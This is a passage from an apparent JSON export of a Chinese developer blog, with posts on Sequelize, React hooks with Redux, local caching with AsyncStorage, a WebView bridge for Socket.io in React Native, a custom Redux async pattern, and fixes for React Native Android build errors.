['createdAt', 'updatedAt'], &#125;, include: [&#123; model: User, // 这里的 where 是 User 的条件 where: &#123; id: Sequelize.col('Article.userId') &#125;, attributes: &#123; exclude: ['createdAt', 'updatedAt'], &#125;, &#125;],&#125;);const list = res.map(i =&gt; i.toJSON());console.log(list[0]); 事务（Transaction）仅有需要事务功能的操作，才使用事务，否则就是多此一举。 123456789101112131415161718sequelize.transaction(t =&gt; &#123; // 在这里链接您的所有查询。确保你返回他们。 return User.create(&#123; firstName: 'Abraham', lastName: 'Lincoln' &#125;, &#123; transaction: t &#125;).then(user =&gt; &#123; return user.setShooter(&#123; firstName: 'John', lastName: 'Boothe' &#125;, &#123; transaction: t &#125;); &#125;);&#125;).then(result =&gt; &#123; // 事务已被提交 // result 是 promise 链返回到事务回调的结果&#125;).catch(err =&gt; &#123; // 事务已被回滚 // err 是拒绝 promise 链返回到事务回调的错误&#125;); 钩子（Hooks）Hooks 就是在特定时机发生的生命函数，创建 Hooks 有两种方式，可以在模型创建时创建，也可以使用方法创建。 1234567891011121314151617181920212223242526272829// 方法 1：在创建模式时指定const User = sequelize.define('user', &#123; username: DataTypes.STRING, mood: &#123; type: DataTypes.ENUM, values: ['happy', 'sad', 'neutral'] &#125; &#125;, &#123; hooks: &#123; beforeValidate(user, options) &#123; user.mood = 'happy'; &#125;, afterValidate(user, options) &#123; user.username = 'Toni'; &#125;, &#125;,&#125;);// 方法 2：通过 .hook() 方法User.hook('beforeValidate', (user, options) =&gt; &#123; user.mood = 'happy';&#125;);// 方法 3：通过直接方法User.beforeCreate((user, options) =&gt; &#123; return hashPassword(user.password).then(hashedPw =&gt; &#123; user.password = hashedPw; &#125;);&#125;); 移除 Hooks 使用 removeHook。 1User.removeHook('afterCreate', 'notifyUsers');","categories":[{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/categories/Mysql/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/tags/Mysql/"}]},{"title":"🎉轻松使用 Hooks 和 Redux 管理全局数据","slug":"React/Hooks/轻松使用 Hooks 和 Redux 管理全局数据","date":"2018-12-23T11:48:57.000Z","updated":"2021-06-15T06:10:52.873Z","comments":true,"path":"/stories/2018/12/React/Hooks/轻松使用 Hooks 和 Redux 管理全局数据/","link":"","permalink":"http://me.lizhooh.com/stories/2018/12/React/Hooks/轻松使用 Hooks 和 Redux 管理全局数据/","excerpt":"前言在上个星期写了一个简单的全局数据管理 🎉：react-use-store，其核心是利用 React 16+ 的 content、17+ 的 hooks 和 redux createStore 构建了一个轻量级的全局数据管理框架。 因为结合了 hooks 的玩法，使用起来非常简单，几行代码就可以胜任之前的的 redux 代码。","text":"前言在上个星期写了一个简单的全局数据管理 🎉：react-use-store，其核心是利用 React 16+ 的 content、17+ 的 hooks 和 redux createStore 构建了一个轻量级的全局数据管理框架。 因为结合了 hooks 的玩法，使用起来非常简单，几行代码就可以胜任之前的的 redux 代码。 先贴一下剪短的代码： 1234567891011121314151617import React from 'react';import useStore from 'react-use-store';export default function app() &#123; const [state, commit, rootState] = useStore('index'); const onClick = e =&gt; &#123; commit(&#123; count: state.count + 1 &#125;); &#125;; return ( &lt;div&gt; &lt;div&gt;Count: &#123;state.count&#125;&lt;/div&gt; &lt;button onClick=&#123;onClick&#125;&#125;&gt;update&lt;/button&gt; &lt;/div&gt; );&#125; 安装建议你用 create-react-app 后安装最新版的 react（需要支持 hooks）。 12yarn add react-use-storeyarn add redux redux-store-init 因为需要使用 redux 来创建 Store 因此，需要安装 redux，这里还安装了笔者写的一键创建 store 库（非必选）。 创建 Reducersstore、reducers、action 这几个元素都是必须的。创建 reducers 需要使用 react-use-store 提供的 createReducers 函数来创建。 123456789101112import &#123; createReducer &#125; from 'react-use-store';// createReducer(name, initState)export const index = createReducer('index', &#123; count: 1,&#125;);export const stories = createReducer('stories', &#123; page: 1, limit: 12, list: [],&#125;); 创建完之后，就是一个切分 store 的方式。下面是创建之后的初始 store 数据的结构。 12345678910const store = &#123; index: &#123; count: 1, &#125;, stories: &#123; page: 1, limit: 12, list: [], &#125;,&#125;; 创建 Store接下来把 reducers 提供给 createStore 完成 store 的创建。 如果你使用我写的 redux-store-init，会显得非常简单，基本一步到位，屏蔽了繁琐的写法。 1234import Store from 'redux-store-init';import * as reducers from './reducers';const store = Store(&#123; reducers, devtool: true &#125;); 提供上下文在创建完成 store 后，需要把 store 提供给 Provider。已经是非常小白的说明了，稍微懂点的都知道是怎么回事。 123456789import &#123; Provider &#125; from 'react-use-store';ReactDOM.render( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt; , document.getElementById('root')); 使用 use-store上面都是一些初始的代码，真正环节现在才开始。 123456789101112131415161718192021import React from 'react';import useStore from 'react-use-store';export default function app() &#123; const [state, commit, rootState] = useStore('index'); const onClick = e =&gt; &#123; commit(&#123; count: state.count + 1 &#125;); &#125;; return ( &lt;div&gt; &lt;div&gt;Count: &#123;state.count&#125;&lt;/div&gt; &lt;button onClick=&#123;onClick&#125;&#125;&gt;update&lt;/button&gt; &lt;pre style=&#123;&#123; fontFamily: 'consolas' &#125;&#125;&gt; &#123;JSON.stringify(rootState, null, 2)&#125; &lt;/pre&gt; &lt;/div&gt; );&#125; 使用起来还真是炸鸡简单，首先 useStore 接收一个参数是 name，指定 reducers 分支的名称，例如上面有 index 和 stories。指定之后获取到的数据当然是分支的数据。 useStore 返回三个数据，第一个是模块的数据，第二个是改变数据的函数，叫：commit，使用起来类似 setState，第三个是全局的数据，就是 root state。 好了，这里需要特别说明的是，commit 会有三种函数形态（😀 是不是有点乱？）： commit(newState) - 接收参数为新的 state，只能改变当前模块的数据。 commit((state, initState) =&gt; newState) - 接收参数为执行函数，执行函数会带有当前模块的 state 和 initState 的值。 commit(name, (state, initState) =&gt; newState) - 接收参数为模块名称和执行函数。 如果第一个参数为字符串，第二个参数为函数，那么更新的是指定的模块数据。例如点击时更新 stories 的数据，你还可以轻松的进行异步操作。 12345678const onClick = async e =&gt; &#123; // 请求下一页数据 const res = await fetch('http://xxx.com/api/list').then(res =&gt; res.json()); commit('stories', state =&gt; (&#123; page: state.page + 1, list: state.concat(res.list), &#125;));&#125;; 😘😘😘😘😘 到这里是不是觉得有点小好用呢？快来支持一下吧。 react-use-store：全局的数据管理 hooks，就像 redux 一样。","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"React 利用 Hooks 轻松缓存数据","slug":"React/Hooks/React 利用 Hooks 轻松缓存数据","date":"2018-12-19T03:17:54.000Z","updated":"2021-06-15T06:10:52.872Z","comments":true,"path":"/stories/2018/12/React/Hooks/React 利用 Hooks 轻松缓存数据/","link":"","permalink":"http://me.lizhooh.com/stories/2018/12/React/Hooks/React 利用 Hooks 轻松缓存数据/","excerpt":"前言在 React Native 的 App 开发里，有时候会有一些需要做本地数据持久化的功能，比如搜索页的搜索历史记录，表情输入的历史记录，首页的数据离线缓存，发表页的草稿功能。这些功能都需要使用的到本地存储 API，在 React Native 上我们常用是 AsyncStorage，在 React 上常用的是 localStorage。 往往很多时候都很难抽象出一个使用简洁的缓存组件（实际上是可以利用 HOC 或 Render Props）。 今天就来研究一下，如何利用 React 的 Hooks 机制，抽象封装不同场景的缓存组件。","text":"前言在 React Native 的 App 开发里，有时候会有一些需要做本地数据持久化的功能，比如搜索页的搜索历史记录，表情输入的历史记录，首页的数据离线缓存，发表页的草稿功能。这些功能都需要使用的到本地存储 API，在 React Native 上我们常用是 AsyncStorage，在 React 上常用的是 localStorage。 往往很多时候都很难抽象出一个使用简洁的缓存组件（实际上是可以利用 HOC 或 Render Props）。 今天就来研究一下，如何利用 React 的 Hooks 机制，抽象封装不同场景的缓存组件。 React Hooks 相关指南文章： 从 HOC、Render Props 到 Hooks 的演变 React 新特性：Hooks 使用指南 Api 缓存 Hooks具体要求： 初次使用时，能够自动的从本地里读取缓存。 每次调用 api 时，能够自动刷新缓存。 缓存有一定的时效。 hooks 使用简单，可配置。 下面使用 AsyncStorage 来封装。 123function useApiMemo(apiFunc, options) &#123; return [data, api];&#125; 首先，定义了函数名为 useApiMemo，入口参数为 api 函数，以及配置尝试，目前可配置缓存初始数据和缓存的 key。返回值为 data 和函数 api，略有不同的是 api 在调用时会自动缓存，也就是在 api 被包了一层。 12345678910111213141516171819202122232425262728import &#123; useState &#125; from 'react';/** * Api 缓存 Hooks * @param&#123;Function&#125; apiFunc * @param&#123;Object&#125; options // &#123; key: '', initData: &#123;&#125; &#125; */function useApiMemo(apiFunc, options) &#123; // 初始读取 const [data, setData] = useState(() =&gt; &#123; AsyncStorage.getItem(options.key).then(res =&gt; &#123; setData(JSON.parse(res)); &#125;); // 初始数据 return options.initData || &#123;&#125;; &#125;); // 包裹 const api = (...arg) =&gt; apiFunc(...arg).then(res =&gt; &#123; AsyncStorage.setItem(options.key, JSON.stringify(res)).then(res =&gt; &#123; setData(res); &#125;); return res; &#125;); // 返回 return [data, api];&#125; 使用 useApiMemo 1234567891011121314function homeApi() &#123; return fetch('http://xxx.com').then(res =&gt; res.json());&#125;export default function app() &#123; const [data, api] = useApiMemo(homeApi, &#123; key: 'home' &#125;); return ( &lt;View&gt; &lt;Text&gt;&#123;data.msg&#125;&lt;/Text&gt; &lt;Button onPress=&#123;e =&gt; api()&#125;&gt;点我更新&lt;/Button&gt; &lt;/View&gt; );&#125; 草稿 Hooks当要做发布文章的草稿功能时，很多时候需要先保存到本地存储里，下面就来实现一个草稿 Hooks。 1234567891011121314151617181920import &#123; useState, useEffect &#125; from 'react';/** * 草稿 Hooks * @param&#123;String&#125; key */function useHistory(key, initData) &#123; // 初始读取 const [data, setData] = useState(() =&gt; &#123; AsyncStorage.getItem(key).then(res =&gt; &#123; setData(JSON.parse(res)); &#125;); return initData; &#125;); useEffect(() =&gt; &#123; AsyncStorage.setItem(key, JSON.stringify(data)); &#125;, [data]); return [data, setData];&#125; 使用的时候非常简单。 12345678910111213141516171819202122export default function app() &#123; const [data, setData] = useHistory('stories', &#123; title: '', content: '' &#125;); return ( &lt;View&gt; &lt;TextInput value=&#123;data.title&#125; onChangeText=&#123;text =&gt; &#123; data.title = text; setData(data); &#125;&#125; /&gt; &lt;TextInput value=&#123;data.content&#125; onChangeText=&#123;text =&gt; &#123; data.content = text; setData(data); &#125;&#125; /&gt; &lt;/View&gt; );&#125; 小结在上面里，我们通过简单的封装，抛砖引玉的实现了一个 Api 缓存的 Hooks。可以看出在使用的时候及其简单，使用者无需知道 useApiMemo 里面的内容，只需要知道使用方法即可实现相关内容。 在 React Hooks 之前，这种功能可能需要使用 HOC 或 Render Props 来实现，显得非常麻烦。而 Hooks 的实现方案让整个代码都变得更加简洁。","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"如何在 React Native 里优雅的使用 Socket.io？","slug":"React Native/Socket/如何在 React Native 里优雅的使用 Socket.io？","date":"2018-12-08T06:44:59.000Z","updated":"2021-06-15T06:10:52.869Z","comments":true,"path":"/stories/2018/12/React Native/Socket/如何在 React Native 里优雅的使用 Socket.io？/","link":"","permalink":"http://me.lizhooh.com/stories/2018/12/React Native/Socket/如何在 React Native 里优雅的使用 Socket.io？/","excerpt":"前言Socket.io 是纯的 Javascript 库，理论上是可以在 React Native 上使用的，React Native 也支持 Websocket 的 API。 但是实际表明不行，试了一下 Socket.id 最新版本和 RN 0.55.4，发现一直都显示无法连接，在 stackoverflow 与 github 上查找问题，一些奇荡技巧都用过了，还是不行。无果，有人也反应了，这个问题，Socket.io 官方也没说能完全支持 React Native，总的来说，坑粑粑的。","text":"前言Socket.io 是纯的 Javascript 库，理论上是可以在 React Native 上使用的，React Native 也支持 Websocket 的 API。 但是实际表明不行，试了一下 Socket.id 最新版本和 RN 0.55.4，发现一直都显示无法连接，在 stackoverflow 与 github 上查找问题，一些奇荡技巧都用过了，还是不行。无果，有人也反应了，这个问题，Socket.io 官方也没说能完全支持 React Native，总的来说，坑粑粑的。 没办法了，业务要用到，这时候这么办呢？只能退一步操作，使用万能的大法，降级方案，就是使用 WebView 作为桥接层，下面会详细说道实施的过程。 补充：重现代码 12345678910111213141516171819202122if (!window.location) &#123; // App is running in simulator window.navigator.userAgent = 'ReactNative';&#125;const io = require('socket.io-client');// 尝试你 http(s) 和 ws(s) 协议都不行const socket = io('ws://192.168.1.111:3000', &#123; jsonp: false, transports: ['websocket']&#125;);socket.on('connect', () =&gt; &#123; console.log('connected!');&#125;);socket.on('connect_error', (e) =&gt; &#123; console.error(e); // 一直都得到 timeout，具体测试后端是没问题的，Σ( ° △ °|||)︴ // h5 端可以正确连接上&#125;); 实施方案首先，使用 WebView 组件作为连接层，在 h5 里可以成功的连接上，其后 H5 通过 通信接口，把接收到的数据传回 React Native。 消息传递路径： 发送消息：RN -&gt; H5 -&gt; 后端 接收消息：后端 -&gt; H5 -&gt; RN 要点： WebView 全局长期存在，无高度和宽度，不可见状态。 H5 端只做消息的中转站。 通过 postMessage 通信，包括发消息和接消息。 通过 redux 管理通信消息数据。 方案想好了，那就开始实施吧，先摆上测试用的后端代码。 123456789101112131415161718192021const app = require('express')();const http = require('http').Server(app);const io = require('socket.io')(http);const colors = require('colors');const port = process.env.PORT || 3000;app.get('/', (req, res) =&gt; &#123; res.sendFile(__dirname + '/index.html');&#125;);io.on('connection', socket =&gt; &#123; console.log('welcome', socket.id.yellow); socket.on('chat message', msg =&gt; &#123; console.log('message:', msg.green); io.emit('chat message', '回复' + msg); &#125;);&#125;);http.listen(port, () =&gt; &#123; console.log('listening on *: ' + port);&#125;); index.html 就是本方案的主角，最为中转站的角色。 下面来看看它的初始化代码。 1234567891011121314151617181920212223242526&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;test&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script src=\"https://cdn.socket.io/socket.io-1.2.0.js\"&gt;&lt;/script&gt; &lt;script&gt; var socket = io('http://192.168.1.111:3000', &#123; transports: ['websocket'], &#125;); // 监听消息（传给 RN） 后端 -&gt; h5 -&gt; RN socket.on('chat message', function (msg) &#123; window.postMessage(msg); &#125;); // 发送消息（来自 RN） -&gt; 后端 window.addEventListener('message', function(e) &#123; const msg = e.data; socket.send('chat message', msg); &#125;); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 注意：不要出现 let，const，() =&gt; {}，等 ES6 语法，不然运行不起来，毕竟 android 的 webview 不太支持。 在 React Native 上你需要这样做。 123456789101112131415&lt;WebView style=&#123;&#123; width: 0, height: 0 &#125;&#125; ref=&#123;r =&gt; this.h5 = r&#125; source=&#123;&#123; uri: 'http://192.168.1.111:3000', baseUrl: '' &#125;&#125; domStorageEnabled=&#123;false&#125; javaScriptEnabled=&#123;true&#125; // 接收消息 onMessage=&#123;e =&gt; &#123; const data = e.nativeEvent.data console.log(data); &#125;&#125;/&gt;// 发送消息 -&gt; h5 -&gt; 后端this.h5.postMessage('hello'); 自定义通信协议实际业务的自定义通信协议比较复杂，这里只讲最简单的消息发送与消息接收。 因为 postMessage 只能接收 string 的数据，为了能传递更多的数据，因此，这里用 JSON 最为序列化与反序列化操作。 定义通信的对象为： 1234&#123; event: '', // 指定监听的事件名 data: &#123; &#125;, // 携带的数据域&#125; 当然，这只是非常简单的代码，还不算是完全的封装。 123456789101112131415161718192021222324252627282930313233import React, &#123; Component &#125; from 'react';import WebViewBridge from 'react-native-webview-bridge';import events from 'events';let h5 = null;// 接收消息function onBridgeMessage(data) &#123; const res = JSON.parse(data); io.emit(res.event, res.data);&#125;class myEvent extends events &#123; // 发送消息 send(event, data) &#123; if (h5) &#123; const res = JSON.stringify(&#123; event, data &#125;); h5.sendToBridge(res); &#125; &#125;&#125;export const io = new myEvent();export default () =&gt; ( &lt;WebViewBridge style=&#123;&#123; flex: 1, &#125;&#125; ref=&#123;r =&gt; h5 = r&#125; onBridgeMessage=&#123;this.onBridgeMessage&#125; source=&#123;&#123; uri: 'http://192.168.1.111:3000', baseUrl: '' &#125;&#125; domStorageEnabled=&#123;false&#125; javaScriptEnabled=&#123;true&#125; /&gt;) 在 h5 里的中转代码： 12345678910111213141516171819202122232425const socket = io('ws://192.168.1.111:3000', &#123; transports: ['websocket'],&#125;);socket.on('msg', function (data) &#123; if (typeof data === 'string') &#123; data = JSON.parse(data); &#125; console.log('来自服务器', data); // 后端 -&gt; h5 -&gt; RN if (window.WebViewBridge) &#123; WebViewBridge.send(JSON.stringify(&#123; event: data.event, data: data, &#125;)); &#125;&#125;);// RN -&gt; h5 -&gt; 后端if (window.WebViewBridge) &#123; WebViewBridge.onMessage = function (str) &#123; const res = JSON.parse(str); socket.emit(res.event, res); &#125;;&#125; 服务器上注意 data 要把 event 名称也有传。 12345678// data = &#123;// event: '',// data: &#123; &#125;,// &#125;socket.on('msg', data =&gt; &#123; console.log('message:', data); io.emit('msg', data);&#125;); 问题这样使用 WebView 作为中间站会不会有问题？的确在具体的测试，中会有一点小小的性能问题，特别是消息发送/接收频繁的时候，总的来说，还是平安的实现了需求。Σ( ° △ °|||)︴还有一点就是代码比较繁琐。","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"Redux 自定义异步操作","slug":"Redux/Redux 自定义异步操作","date":"2018-12-05T16:22:15.000Z","updated":"2021-06-15T06:10:52.891Z","comments":true,"path":"/stories/2018/12/Redux/Redux 自定义异步操作/","link":"","permalink":"http://me.lizhooh.com/stories/2018/12/Redux/Redux 自定义异步操作/","excerpt":"前言Redux 是一个全局的状态数据管理框架，在大多数情况下，我们都会有多多少少的异步请求，也就是所谓的“异步流程控制”。 在 Redux 里，你可以使用 redux-thunk，redux-saga，redux-actions 等中间件来管理你的异步流程。这些库其核心原理都是对 Redux 的数据改变流程进行了修饰使用的异步 dispatch 的可能。 今天就来聊聊，如何不使用第三方库，在 Redux 里进行异步的操作。 在阅读前，默认认为你已经具备了 Redux 基础的知识。","text":"前言Redux 是一个全局的状态数据管理框架，在大多数情况下，我们都会有多多少少的异步请求，也就是所谓的“异步流程控制”。 在 Redux 里，你可以使用 redux-thunk，redux-saga，redux-actions 等中间件来管理你的异步流程。这些库其核心原理都是对 Redux 的数据改变流程进行了修饰使用的异步 dispatch 的可能。 今天就来聊聊，如何不使用第三方库，在 Redux 里进行异步的操作。 在阅读前，默认认为你已经具备了 Redux 基础的知识。 规划目录在开始之后，先来讲讲开发的目录。把 redux 相关的代码都放在 redux 目录里，redux/index.js 就是初始化 store 的代码。 12345678redux - index.js - reducers.js // store 切分 - util.js - actions // action 分支 - index.js - user.js - theme.js 创建 Store在 redux/index.js 里就是创建 store 的代码。这里使用了笔者写的 redux-store-init 一键创建 store，它需要一个 reducers 对象。 12345678// redux/index.jsimport Store from 'redux-store-init';import * as reducers from './reducers';export default new Store(&#123; reducers, devtool: true,&#125;); 创建完 store 后，就可以给 Provider 。 12345export default () =&gt; ( &lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt; &lt;/Provider&gt;); 工具函数在 redux/util.js 里提供，一些工具函数，例如获取全局的数据，获取 dispatch 等。 此外，还定义了一个非常重要的函数：commit，它接收 name 和回调函数，用于改变 store 的 state。 通过调用 dispatch，发出改变状态的指令，注意到这里的 action 对象只有两个属性：type, newState。 type 用于指定归属的 reducers，而 newState 是一个函数，用于说明改变的 state。 12345678910111213141516171819202122232425262728293031323334// redux/util.jsimport store from './index';const keys = Object.keys(store.getState());export const getState = (...arg) =&gt; store.getState(...arg);export const dispatch = (...arg) =&gt; store.dispatch(...arg);/** * 提交一个数据的变化 * commit('index', (state, initState) =&gt; newState) * commit('index', newState) * @param&#123;String&#125; name - 模块名称 * @param&#123;Function|Object&#125; callback/newState - 返回新数据的回调函数或新的数据 * @return&#123;Object&#125; newState - 改变后的数据*/export const commit = (name, oper) =&gt; &#123; let _newState = null; // 参数匹配已经指定的模块需要存在 if (isStr(name) &amp;&amp; (isFun(oper) || isObj(oper)) &amp;&amp; keys.includes(name)) &#123; dispatch(&#123; type: name || '$$root', newState: (state, initState) =&gt; &#123; _newState = isFun(oper) ? &#123; ...state, ...oper(state, initState) &#125; : &#123; ...state, ...oper &#125;; return _newState; &#125;, &#125;); return _newState; &#125; console.warn('parameter error'); return _newState;&#125; 在 redux-thunk 里提供 dispatch, getState 参数，实际上这些都是从 store 里获取的 创建 Reducer基于上面的 commit 函数，这里使用统一的 Reducer 创建方式。与传统的 switch - case 的写法相比，其特点就是简单不累赘，减少了很多代码（50% 以上），缺点就是不好测试，不太好调试。 下面是典型的传统方式，也是官方的写法。在 reducer 里很多 switch - case。 12345678910function counter(state = 0, action) &#123; switch (action.type) &#123; case 'INCREMENT': return state + 1 case 'DECREMENT': return state - 1 default: return state &#125;&#125; 下面是通过判断 type 与 name 是否匹配，如果匹配则调用 newState，返回新的数据。也就是数据的改变发生在 dispatch 的 newState 里，reducer 里至少做匹配并返回。 12345678910111213141516171819202122232425262728// redux/reducers.jsfunction createReducer(name, initState) &#123; return (state = initState, action) =&gt; &#123; if (action.newState &amp;&amp; !isFunction(action.newState)) &#123; console.warn(`[$&#123;name&#125;] action.newState is not a function`); return state; &#125; if (action.type === name) &#123; return action.newState(state, initState) || state; &#125; return state; &#125;;&#125;// 创建了一个用于管理主题的 reducerexport const theme = createReducer('theme', &#123; color: '#39f', navBarHeight: 55, tabsViewHeight: 55, mainMaxWidth: 640,&#125;);// 创建了一个用户信息相关的 reducerexport const user = createReducer('user', &#123; id: 1, name: '', email: '',&#125;); 在 redux/index.js 导出的 reducers 实际上是： 1234&#123; theme: () =&gt; (), user: () =&gt; (),&#125; 那么，如何改变 store 的 state 呢？通常直接调用 dispatch 即可，但是在这里调用 commit 会更方便（实际上也是调用 dispatch）。 下面来试一下，使用 commit 改变 theme 的 color。 123456import &#123; commit &#125; from '../util';// redux/actions/theme.jsexport const updateThemeColor = color =&gt; &#123; commit('theme', state =&gt; (&#123; color &#125;));&#125; commit 的第一个参数为 action.type 匹配的值，第二个参数为改变数据状态的函数，此函数第一个参数匹配的 reducer state，第二个参数是匹配的 reducer initState。（听起来挺复杂的，不如再看看 commit 和 createReducer 的代码）。 异步操作上面演示了如何通过 commit 来改变 store 的 state，那么在有异步的时候会怎样呢？ 因为 commit 只是一个普通的函数，所以，可以轻松的把它应用在异步里。 12345678import &#123; commit &#125; from '../util';import * as api from '../../api';// redux/actions/theme.jsexport const updateThemeColor = async () =&gt; &#123; const res = await api.getThemeColorConfig(); commit('theme', state =&gt; (&#123; color: res &#125;));&#125; 你可以在异步完成之后，再调用 commit，完全没问题。 但是有一个要求是不能在 connect 注入此 action，不然会受到 async action 的警告。因为 connect 的第二个参数里的函数必须是返回 action 对象的函数。 123456import * as actions from '../redux/actions/theme';export default connect( state =&gt; state, actions, // 这是错误的做法)(App); 你应该单独的使用 actions，而不是把它注入到 props 里再使用。 123456789// 错误做法&lt;button onClick=&#123;e =&gt; this.props.actions.updateThemeColor('#f34')&#125;&gt; 更新 color&lt;/button&gt;// 正确做法&lt;button onClick=&#123;e =&gt; actions.updateThemeColor('#f34')&#125;&gt; 更新 color&lt;/button&gt; 小结纵观整个过程，可以发现，代码非常少，并且很简洁，非常接近 this.setState 的操作方式，正是如此，说明了 redux 是可以非常灵活的自定义的。 实际是 redux 是一个函数式编程框架，reducer 只是一个函数，它接收 state 和 action 返回新的 state。action 也是一个函数，它接收预定义的参数，返回告诉 reducer 如何做变化的关键量。 我们完全可以站在这两个概念的基础和要求下，定义出一套新的 store 操作方式，就像 redux-saga、redux-actions 一样。这一切都取决于你的想法以及设计思想。","categories":[{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/categories/Redux/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"Redux","slug":"Redux","permalink":"http://me.lizhooh.com/tags/Redux/"}]},{"title":"React Native 编译失败集合","slug":"React Native/React Native 编译失败集合","date":"2018-11-28T02:10:42.000Z","updated":"2021-06-15T06:10:52.865Z","comments":true,"path":"/stories/2018/11/React Native/React Native 编译失败集合/","link":"","permalink":"http://me.lizhooh.com/stories/2018/11/React Native/React Native 编译失败集合/","excerpt":"前言在编译 React Native 应用时多多少少会遇到编译失败的问题，红屏不可怕，编译失败才可怕。下面总结的常见的编译失败以及修复方法。","text":"前言在编译 React Native 应用时多多少少会遇到编译失败的问题，红屏不可怕，编译失败才可怕。下面总结的常见的编译失败以及修复方法。 编译失败集合列出常见或不常见的编译错误场景，已经修复方案。 错误 1（文件占用问题）12345FAILURE: Build failed with an exception.* What went wrong:Execution failed for task ':app:processDebugResources'.&gt; java.io.IOException: Could not delete path 'H:\\React-Native\\myapp-image-view\\android\\app\\build\\generated\\source\\r\\debug\\com'. 这是 vscode 对文件有占用的使用权，导致 React Native 无法删除重写文件内容，删除 android/app/build 下的目录后重新编译即可。常见的 java.io 错误都有可能是类似的问题（文件权限问题）。 同理的，只要出现：java.io.IOException: Could not delete path。 也可以使用命令： 1gradlew clean 错误 2（安装 apk 问题）12345FAILURE: Build failed with an exception.* What went wrong:Execution failed for task ':app:installDebug'.&gt; com.android.builder.testing.api.DeviceException: No connected devices! 找不到设备的连接，把 Android Virtual Device AVD 打开一个 Android 模拟器后再重新编译。这时候已经有 debug 的 apk 的文件编程完成，只不过到了安装 apk 时出错，不要被 Build failed 给骗了。 错误 3（SDK 版本问题）12345FAILURE: Build failed with an exception.* What went wrong:Execution failed for task ':app:processDebugResources'.&gt; com.android.ide.common.process.ProcessException: Failed to execute aapt 原因是 compileSdkVersion 和 buildToolsVersion 不匹配，去 android/app/build.gradle 把改一下编译工具版本。 12compileSdkVersion 26buildToolsVersion \"26.0.3\" 有时候，改了 compileSdkVersion 和 buildToolsVersion 还是出错，重启一下 vscode 又好了（进程问题？）。 错误 4（gradle 问题）12Failed to apply plugin [id 'com.android.application']Gradle version 2.2 is required. Current version is 2.10 If using the gradle wrapper, try editing the distributionUrl in xxxxxxxxx Gradle 版本问题，把电脑上的 Gradle 删除后重新安装。Gradle 在 C:\\Users\\Administrator\\.gradle 里。 错误 5（依赖问题）1234567:app:transformClassesWithDexForDebug FAILEDFAILURE: Build failed with an exception.* What went wrong:Execution failed for task ':app:transformClassesWithDexForDebug'.&gt; com.android.build.api.transform.TransformException: com.android.ide.common.process.ProcessException: java.util.concurrent.ExecutionException: java.lang.UnsupportedOperationException 感觉出现：java.util.concurrent.ExecutionException 都可以归纳为依赖问题。 依赖重复或冲突的问题，可以尝试在 android -&gt; defaultConfig 里添加： 1multiDexEnabled true multiDexEnabled 设置为 true 时大部分的情况下是可以解决的，如不行尝试以下方法。 找出冲突的包，把冲突的部分注释掉。 例如：react-native-wechat 与 react-native-fast-image 在编译时发生依赖冲突，把 react-native-fast-image 的 support 注释掉，即可成功编译。 12345dependencies &#123; compile \"com.facebook.react:react-native:$&#123;_reactNativeVersion&#125;\" // compile \"com.android.support:support-v4:$&#123;safeExtGet('supportLibVersion', '27.1.1')&#125;\" compile(\"com.github.bumptech.glide:glide:$&#123;_glideVersion&#125;\") &#123;&#125; 这个错误很无厘头，如果不行那只能跪了。 错误 6（依赖问题）123* What went wrong:A problem occurred evaluating project ':react-native-fast-image'.&gt; Could not find method implementation() for arguments [com.facebook.react:react-native:+] on object of type org.gradle.api.internal.artifacts.dsl.dependencies.DefaultDependencyHandler. 这种错误在 react native &lt;= 0.55.4 可能会出现，主要是第三方用了新的声明。找到出错的库的 build.gradle，把 implementation 换成 compile 即可。 错误 7（依赖问题）123* What went wrong:Execution failed for task ':app:lintVitalRelease'.&gt; java.lang.NullPointerException (no error message) 这种情况，估计是使用了一些坑爹的第三方库。 运行命令： 1./gradlew app:assembleRelease -x lintVitalRelease 在 android/app/build.gradle 文件里添加。 1234567android &#123; // ... lintOptions &#123; checkReleaseBuilds false &#125; // ...&#125; 如果还不行，则只能一个一个第三方的库进行排查。 错误 8（运行问题）12Execution failed for task ':app:bundleReleaseJsAndAssets'. &gt; A problem occurred starting process 'command 'node' 已有命令在运行？解决方法是先 stop 再 assembleRelease。 12./gradlew stop./gradlew assembleRelease 错误 9（网络问题）12345678910FAILURE: Build failed with an exception.* What went wrong:A problem occurred configuring project ':app'.&gt; Could not resolve all dependencies for configuration ':app:_debugApk'. &gt; A problem occurred configuring project ':react-native-ilive'. &gt; Could not download 